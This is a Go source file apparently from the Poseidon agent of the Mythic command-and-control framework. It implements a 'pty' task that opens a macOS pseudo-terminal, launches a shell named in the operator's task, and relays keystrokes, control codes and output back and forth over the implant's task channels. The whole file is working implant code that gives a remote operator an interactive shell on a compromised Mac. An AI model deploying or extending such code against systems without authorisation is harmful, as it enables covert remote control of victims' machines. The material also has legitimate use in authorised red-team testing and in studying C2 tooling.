package pty

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
	"github.com/creack/pty"
	"io"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// ioctl, open, _IOC_PARAM_LEN, ptsname, grantpt, unlockpt all taken from https://github.com/creack/pty/blob/master/pty_darwin.go

const (
	_IOC_PARAM_SHIFT = 13
	_IOC_PARAM_MASK  = (1 << _IOC_PARAM_SHIFT) - 1
)

func ioctl(fd, cmd, ptr uintptr) error {
	_, _, e := syscall.Syscall(syscall.SYS_IOCTL, fd, cmd, ptr)
	if e != 0 {
		return e
	}
	return nil
}
func open() (pty, tty *os.File, err error) {
	pFD, err := syscall.Open("/dev/ptmx", syscall.O_RDWR|syscall.O_CLOEXEC|syscall.O_NOCTTY, 0)
	if err != nil {
		return nil, nil, err
	}
	p := os.NewFile(uintptr(pFD), "/dev/ptmx")
	// In case of error after this point, make sure we close the ptmx fd.
	defer func() {
		if err != nil {
			_ = p.Close() // Best effort.
		}
	}()

	sname, err := ptsname(p)
	if err != nil {
		return nil, nil, err
	}

	if err := grantpt(p); err != nil {
		return nil, nil, err
	}

	if err := unlockpt(p); err != nil {
		return nil, nil, err
	}

	t, err := os.OpenFile(sname, os.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		return nil, nil, err
	}
	return p, t, nil
}
func _IOC_PARM_LEN(ioctl uintptr) uintptr {
	return (ioctl >> 16) & _IOC_PARAM_MASK
}
func ptsname(f *os.File) (string, error) {
	n := make([]byte, _IOC_PARM_LEN(syscall.TIOCPTYGNAME))

	err := ioctl(f.Fd(), syscall.TIOCPTYGNAME, uintptr(unsafe.Pointer(&n[0])))
	if err != nil {
		return "", err
	}

	for i, c := range n {
		if c == 0 {
			return string(n[:i]), nil
		}
	}
	return "", errors.New("TIOCPTYGNAME string not NUL-terminated")
}
func grantpt(f *os.File) error {
	return ioctl(f.Fd(), syscall.TIOCPTYGRANT, 0)
}
func unlockpt(f *os.File) error {
	return ioctl(f.Fd(), syscall.TIOCPTYUNLK, 0)
}
func customPtyStart(command *exec.Cmd) (*os.File, error) {
	ptmx, tty, err := open()
	if err != nil {
		return nil, err
	}
	defer func() { _ = tty.Close() }()
	command.Stdin = tty
	command.Stdout = tty
	command.Stderr = tty
	command.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true, // required to get job control
		Setctty: true,
		Ctty:    0,
	}
	err = command.Start()
	if err != nil {
		_ = ptmx.Close()
		return nil, err
	}
	return ptmx, err
}

type Args struct {
	ProgramPath string `json:"program_path"`
}

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := Args{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	shellBin := args.ProgramPath
	if _, err = os.Stat(shellBin); err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	command := exec.Command(shellBin)
	command.Env = os.Environ()
	outputChannel := make(chan string, 1)
	errorChannel := make(chan string, 1)
	StdinStdoutPTY, err := customPtyStart(command)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	defer func() { _ = StdinStdoutPTY.Close() }() // Best effort.
	pty.Setsize(StdinStdoutPTY, &pty.Winsize{Cols: 80, Rows: 30})

	/*
		oldState, err := terminal.MakeRaw(int(StdinStdoutPTY.Fd()))
		if err != nil {
			fmt.Printf("error saving terminal state: %v\n", err)
			msg.SetError("Could not save terminal state")
			task.Job.SendResponses <- msg
			return
		}
		defer func() { _ = terminal.Restore(int(StdinStdoutPTY.Fd()), oldState) }()

	*/

	doneChannel := make(chan bool)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		// wait for stdin data and pass that along
		for {
			select {
			case inputMsg := <-task.Job.InteractiveTaskInputChannel:
				data, err := base64.StdEncoding.DecodeString(inputMsg.Data)

				if err != nil {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(err.Error())),
						MessageType: InteractiveTask.Error,
					}
					continue
				}
				fmt.Printf("got a message from interactive tasking (%d):\n%s\n", inputMsg.MessageType, data)
				err = nil
				switch inputMsg.MessageType {
				case InteractiveTask.Input:
					_, err = io.Copy(StdinStdoutPTY, bytes.NewReader(data))
				case InteractiveTask.CtrlA:
					_, err = StdinStdoutPTY.Write([]byte{0x01})
				case InteractiveTask.CtrlB:
					_, err = StdinStdoutPTY.Write([]byte{0x02})
				case InteractiveTask.CtrlC:
					_, err = StdinStdoutPTY.Write([]byte{0x03})
				case InteractiveTask.CtrlD:
					_, err = StdinStdoutPTY.Write([]byte{0x04})
				case InteractiveTask.CtrlE:
					_, err = StdinStdoutPTY.Write([]byte{0x05})
				case InteractiveTask.CtrlF:
					_, err = StdinStdoutPTY.Write([]byte{0x06})
				case InteractiveTask.CtrlG:
					_, err = StdinStdoutPTY.Write([]byte{0x07})
				case InteractiveTask.Backspace:
					_, err = StdinStdoutPTY.Write([]byte{0x08})
				case InteractiveTask.Tab:
					if len(data) > 0 {
						_, err = io.Copy(StdinStdoutPTY, bytes.NewReader(data))
					}
					_, err = StdinStdoutPTY.Write([]byte{0x09})
				case InteractiveTask.CtrlK:
					_, err = StdinStdoutPTY.Write([]byte{0x0B})
				case InteractiveTask.CtrlL:
					_, err = StdinStdoutPTY.Write([]byte{0x0C})
				case InteractiveTask.CtrlN:
					_, err = StdinStdoutPTY.Write([]byte{0x0E})
				case InteractiveTask.CtrlP:
					_, err = StdinStdoutPTY.Write([]byte{0x10})
				case InteractiveTask.CtrlQ:
					_, err = StdinStdoutPTY.Write([]byte{0x11})
				case InteractiveTask.CtrlR:
					_, err = StdinStdoutPTY.Write([]byte{0x12})
				case InteractiveTask.CtrlS:
					_, err = StdinStdoutPTY.Write([]byte{0x13})
				case InteractiveTask.CtrlU:
					_, err = StdinStdoutPTY.Write([]byte{0x15})
				case InteractiveTask.CtrlW:
					_, err = StdinStdoutPTY.Write([]byte{0x17})
				case InteractiveTask.CtrlY:
					_, err = StdinStdoutPTY.Write([]byte{0x19})
				case InteractiveTask.CtrlZ:
					_, err = StdinStdoutPTY.Write([]byte{0x1A})
				case InteractiveTask.Escape:
					_, err = StdinStdoutPTY.Write([]byte{0x1B})
					if len(data) > 0 {
						_, err = io.Copy(StdinStdoutPTY, bytes.NewReader(data))
					}
				default:
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte("Unknown control code")),
						MessageType: InteractiveTask.Error,
					}
					return
				}
				if err != nil {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(err.Error())),
						MessageType: InteractiveTask.Error,
					}
				}
				fmt.Printf("successfully sent message along to interactive session\n")
			}
		}
	}()
	go func() {
		bufferedOutput := ""
		bufferedError := ""
		for {
			select {
			case <-doneChannel:
				if bufferedOutput != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedOutput)),
						MessageType: InteractiveTask.Output,
					}
				}
				if bufferedError != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedError)),
						MessageType: InteractiveTask.Error,
					}
				}
				return
			case newBufferedOutput := <-outputChannel:
				fmt.Printf("got new output for buffered channel:\n%s", newBufferedOutput)
				bufferedOutput += newBufferedOutput
			case newBufferedError := <-errorChannel:
				fmt.Printf("got new error for buffered channel:\n%s", newBufferedError)
				bufferedError += newBufferedError
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedOutput)),
						MessageType: InteractiveTask.Output,
					}
					bufferedOutput = ""
				}
				if bufferedError != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedError)),
						MessageType: InteractiveTask.Error,
					}
					bufferedError = ""
				}

			}
		}
	}()
	go func() {
		for {
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(1 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	go func() {
		reader := bufio.NewReader(StdinStdoutPTY)
		buff := make([]byte, 1024)
		var totalRead int = 0
		var readError error = nil
		for readError == nil {
			totalRead, readError = reader.Read(buff)
			if readError != nil && readError == io.EOF {
				fmt.Printf("reached EOF\n")
				return
			} else if readError != nil {
				fmt.Printf("got an error reading: %v\n", err)
				return
			} else {
				outputChannel <- fmt.Sprintf("%s", string(buff[:totalRead]))
			}
		}
		fmt.Printf("Finished reading from tty\n")
	}()
	err = command.Wait()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	outputMsg := structs.Response{}
	outputMsg.TaskID = task.TaskID
	outputMsg.Completed = true
	task.Job.SendResponses <- outputMsg
	doneTimeDelayChannel <- true
	doneChannel <- true
	return
}
